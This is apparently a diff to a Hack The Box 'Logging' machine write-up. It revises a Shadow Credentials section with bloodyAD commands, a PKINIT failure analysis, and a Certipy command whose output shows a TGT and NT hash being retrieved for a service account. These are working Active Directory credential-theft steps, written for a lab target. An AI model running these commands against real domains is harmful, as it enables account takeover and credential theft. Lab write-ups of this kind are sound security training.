@@ -1033,9 +1033,11 @@ The **Logging** machine presents a highly realistic Windows environment that hig
 
 ### Exploitation: Shadow Credentials via bloodyAD (with Caveats)
 
-Initially, `bloodyAD` was used to orchestrate the Shadow Credentials attack using our cached Kerberos ticket (`-k`).
+While `bloodyAD` is incredibly efficient at injecting Shadow Credentials via LDAP, it can fail during the **PKINIT** authentication phase in strict Kerberos environments.
 
-```Bash
+Initially, `bloodyAD` was used to orchestrate the attack using our cached Kerberos ticket (`-k`).
+
+```bash
 # Inject Shadow Credentials and retrieve the NT hash
 ➜ env KRB5CCNAME=svc_recovery.ccache \
 fake_time dc01.logging.htb \
@@ -1050,14 +1052,14 @@ bloodyAD --host dc01.logging.htb -d logging.htb \
 NT: 603fc24ee01a9409f83c9d1d701485c5
 ```
 
-However, in persistent environments, the attack fails during the PKINIT authentication phase:
+Here, `bloodyAD` successfully generated the key pair and wrote the public key to `msDS-KeyCredentialLink`, but crashed during the **PKINIT** pre-authentication phase when attempting to request the TGT:
 
 ```Bash
 ➜ env KRB5CCNAME=svc_recovery.ccache \
 fake_time dc01.logging.htb \
-bloodyAD -H dc01.logging.htb -d logging.htb \
-        -u 'svc_recovery' -k \
-        add shadowCredentials 'msa_health$'
+bloodyAD --host dc01.logging.htb -d logging.htb \
+    -u 'svc_recovery' -k \
+    add shadowCredentials 'msa_health$'
 
 [+] KeyCredential generated with following sha256 of RSA key: 0699bd312a8b60b08f48200619dea7ebcee1ec09d874dfffc094671f08ec875b
 [-] PKINIT failed on DC 10.129.62.234, you must find a Kerberos server with a certification authority!
@@ -1071,6 +1073,44 @@ kerbad.protocol.errors.KerberosError:  Error Name: KDC_ERR_PADATA_TYPE_NOSUPP De
 **Technical Analysis of the Failure**:
 
 The attack failed with `KDC_ERR_PADATA_TYPE_NOSUPP` during the PKINIT authentication phase. This occurred because `bloodyAD`'s underlying Kerberos library (`kerbad`) automatically resolved the DC to an IP address (`10.129.62.234`). During the TLS handshake, this caused a Subject Alternative Name (SAN) mismatch against the Domain Controller's certificate, prompting the KDC to reject our pre-authentication data.
+
+### Remediation: Authenticating with Certipy
+
+Even though `bloodyAD` crashed during the **PKINIT** phase, it successfully generated and saved the certificate locally (msa_health_Ww.pfx). We can bypass the strict validation error by feeding this saved certificate directly into Certipy to complete the authentication and retrieve the NT hash.
+
+```Bash
+➜ fake_time dc01.logging.htb \
+certipy auth \
+    -pfx msa_health_Ww.pfx \
+    -u 'msa_health$' \
+    -domain logging.htb -dc-ip $target_ip \
+    -debug
+
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[+] Target name (-target) and DC host (-dc-host) not specified. Using domain '' as target name. This might fail for cross-realm operations
+[+] Nameserver: '10.129.62.234'
+[+] DC IP: '10.129.62.234'
+[+] DC Host: ''
+[+] Target IP: '10.129.62.234'
+[+] Remote Name: '10.129.62.234'
+[+] Domain: ''
+[+] Username: 'MSA_HEALTH$'
+[*] Certificate identities:
+[*]     SAN DNS Host Name: 'CN=msa_health,CN=Managed Service Accounts,DC=logging,DC=htb'
+[!] The provided username does not match the identity found in the certificate: 'msa_health$' - 'CN=msa_health,CN=Managed Service Accounts,DC=logging,DC=htb'
+Do you want to continue? (Y/n): Y
+[*] Using principal: 'msa_health$@logging.htb'
+[*] Trying to get TGT...
+[+] Sending AS-REQ to KDC logging.htb (10.129.62.234)
+[*] Got TGT
+[*] Saving credential cache to 'msa_health.ccache'
+[+] Attempting to write data to 'msa_health.ccache'
+[+] Data written to 'msa_health.ccache'
+[*] Wrote credential cache to 'msa_health.ccache'
+[*] Trying to retrieve NT hash for 'msa_health$'
+[*] Got hash for 'msa_health$@logging.htb': aad3b435b51404eeaad3b435b51404ee:603fc24ee01a9409f83c9d1d701485c5
+```
 
 **Recommendation**: Use `Certipy` for Shadow Credentials attacks in strict Kerberos environments. `bloodyAD` remains useful for other LDAP-based attacks that don't require PKINIT.
 
